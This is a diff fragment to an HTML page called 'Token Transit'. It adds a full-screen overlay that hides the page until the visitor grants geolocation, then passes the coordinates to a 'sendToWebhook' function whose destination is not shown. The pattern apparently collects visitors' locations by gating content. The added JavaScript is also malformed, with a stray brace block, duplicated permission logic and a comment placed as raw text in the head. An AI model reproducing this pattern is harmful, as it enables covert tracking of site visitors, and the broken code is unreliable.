@@ -7,7 +7,23 @@
 	<link rel="icon" type="image/x-icon" href="img/favicon.ico">
 	<link rel="apple-touch-icon" href="img/bigTokenFavicon.png">
     <title>Token Transit</title>
-	
+	<style>
+    #overlay {
+      position: fixed;
+      inset: 0;
+      background: #111;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    #content {
+      display: none;
+    }
+	</style>
 	// Created by Richard Rhodes //
 </head>
 <body>
@@ -106,7 +122,18 @@ function runOnEnter() {
     console.error("Geolocation not supported");
     return;
   }
+{
+      // Permission granted
+      document.getElementById("overlay").style.display = "none";
+      document.getElementById("content").style.display = "block";
+	// allowed permission
 
+	
+document.getElementById("allow").addEventListener("click", () => {
+  if (!navigator.geolocation) {
+    alert("Geolocation not supported");
+    return;
+  }
   navigator.geolocation.getCurrentPosition(
     (position) => {
       sendToWebhook({
